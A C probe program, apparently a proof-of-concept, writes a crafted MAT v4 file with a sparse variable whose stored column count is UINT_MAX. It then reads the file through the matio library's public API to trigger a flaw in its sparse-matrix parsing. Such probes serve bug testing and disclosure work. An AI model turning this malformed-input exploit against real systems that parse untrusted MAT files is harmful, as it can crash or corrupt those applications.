/* Probe: read a crafted MAT v4 file containing a sparse variable whose
 * stored column dimension is at the upper end of the format's 32-bit index
 * range. The library is driven only through its public API.
 */
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <matio.h>

static int write_crafted_v4(const char *path)
{
    FILE *f = fopen(path, "wb");
    if ( NULL == f )
        return -1;

    /* V4 variable header: MOPT (M=0 IEEE LE, O=0, P=0 double, T=2 sparse) */
    {
        const int32_t mopt = 2;
        const int32_t mrows = 3; /* nir + 1 = 3 -> nir = 2 */
        const int32_t ncols = 3; /* real sparse */
        const int32_t imagf = 0;
        const int32_t namelen = 2;
        const char name[2] = {'a', '\0'};
        fwrite(&mopt, sizeof(mopt), 1, f);
        fwrite(&mrows, sizeof(mrows), 1, f);
        fwrite(&ncols, sizeof(ncols), 1, f);
        fwrite(&imagf, sizeof(imagf), 1, f);
        fwrite(&namelen, sizeof(namelen), 1, f);
        fwrite(name, 1, 2, f);
    }

    /* Sparse payload: (nir+1) x 3 doubles, column major.
     * Column 1: row indices (1-based), then the actual row count.
     * Column 2: column indices, then the actual column count.
     * Column 3: the nonzero values.
     */
    {
        const double col1[3] = {1.0, 1.0, 1.0};
        const double col2[3] = {1.0, 1.0, 4294967295.0}; /* cols = UINT_MAX */
        const double col3[3] = {1.0, 1.0, 0.0};
        fwrite(col1, sizeof(double), 3, f);
        fwrite(col2, sizeof(double), 3, f);
        fwrite(col3, sizeof(double), 3, f);
    }

    if ( 0 != fclose(f) )
        return -1;
    return 0;
}

int main(void)
{
    const char *path = "matio_probe_input.mat";
    mat_t *mat;
    matvar_t *matvar;

    if ( 0 != write_crafted_v4(path) ) {
        fprintf(stderr, "failed to write crafted file\n");
        return 2;
    }

    mat = Mat_Open(path, MAT_ACC_RDONLY);
    if ( NULL == mat ) {
        fprintf(stderr, "failed to open crafted file\n");
        remove(path);
        return 2;
    }

    while ( NULL != (matvar = Mat_VarReadNext(mat)) ) {
        Mat_VarFree(matvar);
    }

    Mat_Close(mat);
    remove(path);
    return 0;
}
